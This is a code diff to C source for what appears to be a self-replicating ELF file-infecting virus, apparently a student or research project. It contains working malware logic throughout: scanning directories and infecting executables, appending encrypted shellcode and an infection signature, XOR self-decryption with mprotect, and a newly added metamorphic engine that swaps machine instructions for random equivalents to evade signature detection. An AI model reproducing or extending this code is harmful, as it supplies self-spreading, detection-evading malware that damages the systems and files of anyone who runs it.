@@ -55,13 +55,6 @@ static void *align(size_t value) {
   return (void *)(((value + (4096 - 1)) & -4096) - 4096);
 }
 
-static void updateSignature(void) {
-  size_t  *signature;
-
-  signature = (void *)dynamicSignature + 4;
-  *signature -= 1;
-}
-
 static int unObfuscate(void) {
   size_t  i;
   size_t  size;
@@ -78,7 +71,6 @@ static int unObfuscate(void) {
     code[i] ^= 0xa5;
     i += 1;
   }
-  updateSignature();
   if (mprotect(aligned, size + ((void *)encryptStart - aligned), PROT_EXEC | PROT_READ) < 0)
     return (-1);
   return (0);
@@ -172,19 +164,6 @@ static int  getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned in
   asm("syscall"
     : "=r" (rax));
   return (rax);
-}
-
-static long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data) {
-  register long   ret asm("rax");
-  register int    rax asm("rax") = 101;
-  register enum __ptrace_request  rdi asm("rdi") = request;
-  register pid_t  rsi asm("rsi") = pid;
-  register void   *rdx asm("rdx") = addr;
-  register void   *r10 asm("r10") = data;
-
-  asm("syscall"
-    : "=r" (ret));
-  return (ret);
 }
 
 static int kill(pid_t pid, int sig) {
@@ -497,16 +476,35 @@ static ssize_t  getrandom(void *buf, size_t buflen, unsigned int flags) {
   return (ret);
 }
 
-static void       dynamicSignature(void) {
-  asm("nop\n\t"
-      "nop\n\t"
-      "nop\n\t"
-      "nop\n\t"
-      "nop\n\t"
-      "nop\n\t"
-      "nop\n\t"
-      "nop");
+static size_t atoi(const char *str) {
+  int     i;
+  size_t  result;
+
+  i = 0;
+  result = 0;
+  while (i < 8) {
+    result = result * 10 + (str[i] - 48);
+    i += 1;
+  }
+  return (result);
 }
+
+static int updateSignature(void) {
+  unsigned long  *signature;
+
+  if (mprotect(align((unsigned long)dynamicSignature - sizeof(unsigned long)), sizeof(unsigned long), PROT_WRITE | PROT_EXEC | PROT_READ) < 0)
+    return (-1);
+  signature = (void *)dynamicSignature - sizeof(unsigned long);
+  *signature -= 1;
+  if (mprotect(align((unsigned long)dynamicSignature - sizeof(unsigned long)), sizeof(unsigned long), PROT_EXEC | PROT_READ) < 0)
+    return (-1);
+  return (0);
+}
+
+const char  signatureNbr[8] __attribute__ ((section (".text#"))) = {
+  "\x00\x00\x00\x00\x00\x00\x00\x00"
+};
+static void       dynamicSignature(void) {}
 
 static int  mapFile(const char *dirname, const char *filename, struct bfile *bin) {
   int         fd;
@@ -546,7 +544,7 @@ static int  mapFile(const char *dirname, const char *filename, struct bfile *bin
     close(fd);
     return (1);
   }
-  len = strlen(payload) + sizeof(size_t) + 1;
+  len = strlen(payload) + MAX_DYN_LEN + 1;
   if ((bin->header = mmap(0, stats.st_size + len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) == NULL) {
     close(fd);
     munmap(tmp, stats.st_size);
@@ -586,13 +584,34 @@ static void updateOffsets(Elf64_Ehdr *header, size_t offset, size_t toAdd) {
     }
 }
 
+static void itoa(char *buffer, unsigned long n) {
+  int   i;
+  unsigned long  tmp;
+
+  i = 0;
+  tmp = n;
+  while (tmp != 0) {
+    tmp /= 10;
+    buffer[i] = 0;
+    i += 1;
+  }
+  if (i == 0) {
+    buffer[i] = '0';
+  }
+  while (i > 0) {
+    buffer[i - 1] = n % 10 + 48;
+    i -= 1;
+    n /= 10;
+  }
+}
+
 static void  appendSignature(struct bfile file) {
   size_t  len;
   char payload[] = PAYLOAD;
 
   len = strlen(payload);
-  memcpy(((void *)file.header) + file.size - len - sizeof(size_t) - 1, payload, len);
-  memcpy(((void *)file.header) + file.size - sizeof(size_t) - 1, (void *)dynamicSignature + 4, sizeof(size_t));
+  memcpy(((void *)file.header) + file.size - len - MAX_DYN_LEN - 1, payload, len);
+  itoa(((void *)file.header) + file.size - MAX_DYN_LEN - 1, *((unsigned long *)((void *)dynamicSignature - sizeof(unsigned long))));
   memset(((void *)file.header) + file.size - 1, 0, 1);
   file.header->e_ident[EI_OSABI] = 0x10;
 }
@@ -616,47 +635,104 @@ static int8_t getRandomNbr(int8_t max) {
   return (buf[0] % (max + 1));
 }
 
+static void updateRegisters(unsigned char *ins, unsigned char *pointer, unsigned char *shellcode, unsigned char *bin, size_t *binSize) {
+  size_t  i;
+  size_t  j;
+
+  j = 0;
+  while (pointer[j] != 0x02) {
+    if (pointer[j] == 0) {
+      j += 1;
+      *binSize += 1;
+      continue ;
+    }
+    i = 0;
+    while (ins[i] != 0x02) {
+      if (((pointer[j] & 0x1) == 0x1 && (ins[i] & 0x1) == 0x1) ||
+          (pointer[j] & 0x4) == 0x4 && (ins[i] & 0x4) == 0x4)
+        bin[*binSize] |= (shellcode[i] & 0x7);
+      if ((pointer[j] & 0x1) == 0x1 && (ins[i] & 0x8) == 0x8 ||
+          (pointer[j] & 0x4) == 0x4 && (ins[i] & 0x20) == 0x20)
+        bin[*binSize] |= ((shellcode[i] >> 3) & 0x7);
+      if ((pointer[j] & 0x8) == 0x8 && (ins[i] & 0x1) == 0x1 ||
+          (pointer[j] & 0x20) == 0x20 && (ins[i] & 0x4) == 0x4)
+        bin[*binSize] |= ((shellcode[i] << 3) & 0x38);
+      if ((pointer[j] & 0x8) == 0x8 && (ins[i] & 0x8) == 0x8 ||
+          (pointer[j] & 0x20) == 0x20 && (ins[i] & 0x20) == 0x20)
+        bin[*binSize] |= (shellcode[i] & 0x38);
+      i += 1;
+    }
+    *binSize += 1;
+    j += 1;
+  }
+}
+
+static void checkInstruction(unsigned char *ins, unsigned char *shellcode, size_t *i) {
+  unsigned char *order;
+  unsigned char *needed;
+  unsigned char *notNeeded;
+
+  order = ins;
+  while (*order != 0x02)
+    order += 1;
+  order += 1;
+  needed = order;
+  while (*needed != 0x02)
+    needed += 1;
+  needed += 1;
+  notNeeded = needed;
+  while (*notNeeded != 0x02)
+    notNeeded += 1;
+  notNeeded += 1;
+  *i = 0;
+  while (ins[*i] != 0x02 &&
+        (((ins[*i] >= 0x03 && ins[*i] <= 0x05 && (shellcode[*i] & notNeeded[*i]) == 0x0)) ||
+        shellcode[*i] == ins[*i] ||
+        ((ins[*i] == 0x01 || ins[*i] == 0x06) && (shellcode[*i] & needed[*i]) == needed[*i] && (shellcode[*i] & notNeeded[*i]) == 0x0))) {
+    if (ins[*i] == 0x01) {
+      if ((order[*i] & 0x1) == 0x1 || (order[*i] & 0x4) == 0x4) {
+        if ((shellcode[*i] & 0x7) == 0x4 || (shellcode[*i] & 0x7) == 0x5)
+          break ;
+      }
+      if ((order[*i] & 0x8) == 0x8 || (order[*i] & 0x20) == 0x20) {
+        if ((shellcode[*i] & 0x38) == 0x20 || (shellcode[*i] & 0x38) == 0x28)
+          break ;
+      }
+    }
+    *i += 1;
+  }
+}
+
+/*  Instructions  - Order - Needed -  Not needed  */
+/*  Source operand = 0b001 - Destination operand = 0b100  */
+/*  0x01=Will be replaced 0x02=Separator  0x03=Switched  0x04=Ignored 0x05=Neg bytes  0x06=Same as 0x1 but do not exclude rbp/rsp  */
 const char  instructions[][MAX_INS_SIZE] __attribute__ ((section (".text#"))) = {
-  "\x48\x89\xc6\x42", // mov rsi, rax
-  "\x48\x8d\x30\x42", // lea rsi, [rax]
-  "\x42",
-  "\x48\x89\xc7\x42", // mov rdi, rax
-  "\x48\x8d\x38\x42", // lea rdi, [rax]
-  "\x42",
-  "\xbf\x00\x00\x00\x00\x42", // mov edi, 0x0
-  "\x31\xff\x90\x90\x90\x42", // xor edi, edi
-  "\x31\xff\xeb\x00\x90\x42", // xor edi, edi\n\t jmp 1
-  "\x31\xff\xeb\x01\x90\x42", // xor edi, edi\n\t jmp 2
-  "\x31\xff\x90\xeb\x00\x42", // xor edi, edi\n\t nop\n\t jmp 1
-  "\x42",
-  "\x48\xc7\xc3\x00\x00\x00\x00\x42", // mov rbx, 0x0
-  "\x48\x31\xdb\x90\x90\x90\x90\x42", // xor rbx ,rbx
-  "\x90\x90\x48\x31\xdb\x90\x90\x42", // xor rbx ,rbx
-  "\x42",
-  "\x48\xc7\xc1\x00\x00\x00\x00\x42", // mov rcx, 0x0
-  "\x48\x31\xc9\x90\x90\x90\x90\x42", // xor rcx ,rcx
-  "\x90\x90\x48\x31\xc9\x90\x90\x42", // xor rcx ,rcx
-  "\x42",
-  "\x48\xc7\xc2\x00\x00\x00\x00\x42", // mov rdx, 0x0
-  "\x48\x31\xd2\x90\x90\x90\x90\x42", // xor rdx ,rdx
-  "\x90\x90\x48\x31\xd2\x90\x90\x42", // xor rdx ,rdx
-  "\x42",
-  "\x48\xc7\xc6\x00\x00\x00\x00\x42", // mov rsi, 0x0
-  "\x48\x31\xf6\x90\x90\x90\x90\x42", // xor rsi ,rsi
-  "\x90\x90\x48\x31\xf6\x90\x90\x42", // xor rsi ,rsi
-  "\x42",
-  "\xbf\x01\x00\x00\x00\x42", // mov edi, 0x1
-  "\x31\xff\x40\xb7\x01\x42", // xor edi, edi\n\t mov dil, 0x1
-  "\x42",
+  "\x48\x89\x01\x02\x00\x00\x0c\x02\x00\x00\xc0\x02\x00\x00\x00\x02", // MOV r/m64,r64
+  "\x48\x8d\x01\x02\x00\x00\x21\x02\x00\x00\x00\x02\x00\x00\xc0\x02", // LEA r/m64,r64
+  "\x02",
+  "\x04\x01\x03\x00\x00\x00\x02\x00\x04\x00\x00\x00\x00\x02\x00\xb8\x00\x00\x00\x00\x02\x41\x40\xc0\x00\x00\x00\x02", // MOV r32,imm32
+  "\x04\x31\x01\x83\x01\x03\x02\x00\x00\x24\x00\x04\x00\x02\x00\x00\xc0\x00\xc0\x00\x02\x00\x00\x00\x00\x00\x00\x02", // XOR r32, r32 \n\t ADD r32,imm32
+  "\x02",
+  "\x48\x83\x06\x05\x02\x00\x00\x01\x00\x02\x00\x00\xe8\x00\x02\x00\x00\x10\x00\x02", // SUB r64, imm8
+  "\x48\x83\x06\x05\x02\x00\x00\x01\x00\x02\x00\x00\xc0\x00\x02\x00\x00\x10\x00\x02", // ADD r64, -imm8
+  "\x02",
+  "\x0f\xb6\x01\x02\x00\x00\x21\x02\x00\x00\x00\x02\x00\x00\x60\x02", // MOVZX r32, r/m8
+  "\x8a\x01\x90\x02\x00\x21\x00\x02\x00\x00\x00\x02\x00\xe0\x00\x02", // MOV r8, r/m8 \n\t NOP
+  "\x02",
+  "\x48\x63\x01\x02\x00\x00\x21\x02\x00\x00\xc0\x02\x00\x00\x00\x02", // MOVSXD r64, r/m32
+  "\x89\x01\x90\x02\x00\x0c\x00\x02\x00\xc0\x00\x02\x00\x00\x00\x02", // MOV r32, r/m32 \n\t NOP
+  "\x02"
 };
 
-static int  copyModifiedCode(struct bfile *new, size_t binSize, size_t size) {
+static void  copyModifiedCode(struct bfile *new, size_t binSize, size_t size) {
   size_t        i;
   size_t        j;
   size_t        k;
   size_t        l;
   unsigned char *ins;
   unsigned char *bin;
+  unsigned char *needed;
+  unsigned char *pointer;
   unsigned char *shellcode;
 
   i = 0;
@@ -665,42 +741,72 @@ static int  copyModifiedCode(struct bfile *new, size_t binSize, size_t size) {
   while (i < size) {
     ins = (void *)copyModifiedCode - sizeof(instructions);
     while (ins != (void *)copyModifiedCode) {
-      j = 0;
-      while (ins[j] != 0x42 && shellcode[i + j] == ins[j])
-        j += 1;
-      if (ins[j] != 0x42 ||
+      checkInstruction(ins, shellcode + i, &j);
+      if (ins[j] != 0x02 ||
   ((void *)(shellcode + i) >= (void *)copyModifiedCode - sizeof(instructions) && (void *)(shellcode + i) < (void *)copyModifiedCode)) {
         ins += MAX_INS_SIZE;
-        if (ins[0] == 0x42)
+        if (ins[0] == 0x02)
           ins += MAX_INS_SIZE;
         continue ;
       }
-      while (ins[0] != 0x42 && ins != (void *)copyModifiedCode - sizeof(instructions))
+      pointer = ins;
+      while (ins[0] != 0x02 && ins != (void *)copyModifiedCode - sizeof(instructions))
         ins -= MAX_INS_SIZE;
-      if (ins[0] == 0x42)
+      if (ins[0] == 0x02)
         ins += MAX_INS_SIZE;
       l = 0;
-      while (ins[0] != 0x42) {
+      while (ins[0] != 0x02) {
         l += 1;
         ins += MAX_INS_SIZE;
       }
-      ins = ins - MAX_INS_SIZE * l + getRandomNbr(l - 1) * MAX_INS_SIZE;
-      i += j;
+      ins = ins - MAX_INS_SIZE * l + getRandomNbr(l - 2) * MAX_INS_SIZE;
+      if (ins >= pointer)
+        ins += MAX_INS_SIZE;
+      needed = ins;
+      while (*needed != 0x02)
+        needed += 1;
+      needed += 1;
+      while (*needed != 0x02)
+        needed += 1;
+      needed += 1;
       k = 0;
-      while (ins[k] != 0x42) {
-        bin[binSize] = ins[k];
+      while (ins[k] != 0x02) {
+        if (ins[k] == 0x01)
+          bin[binSize] = needed[k];
+        else if (ins[k] == 0x03) {
+          l = 0;
+          while (pointer[l] != 0x03)
+            l += 1;
+          bin[binSize] = shellcode[i + l];
+        }
+        else if (ins[k] == 0x04)
+          bin[binSize] = shellcode[i + k];
+        else if (ins[k] == 0x05)
+          bin[binSize] = -shellcode[i + k];
+        else if (ins[k] == 0x06)
+          bin[binSize] = needed[k];
+        else
+          bin[binSize] = ins[k];
         binSize += 1;
         k += 1;
       }
-      while (ins[0] != 0x42)
+      binSize -= k;
+      k += 1;
+      pointer += k;
+      updateRegisters(pointer, ins + k, shellcode + i, bin, &binSize);
+      i += j;
+      while (ins[0] != 0x02)
         ins += MAX_INS_SIZE;
       ins += MAX_INS_SIZE;
+      if (ins == (void *)copyModifiedCode) {
+        ins = (void *)copyModifiedCode - sizeof(instructions);
+        continue ;
+      }
     }
     bin[binSize] = shellcode[i];
     i += 1;
     binSize += 1;
   }
-  return (0);
 }
 
 static int  appendShellcode(struct bfile *bin) {
@@ -832,9 +938,11 @@ static int  infectBins(const char *dirname) {
       if (isInfected(bin)) {
         close(bin.fd);
         munmap(bin.header, bin.size);
-      } else
+      } else {
+        updateSignature();
         if (infectFile(bin) == -1)
           return (-1);
+      }
     }
     bpos += dirp->d_reclen;
   }
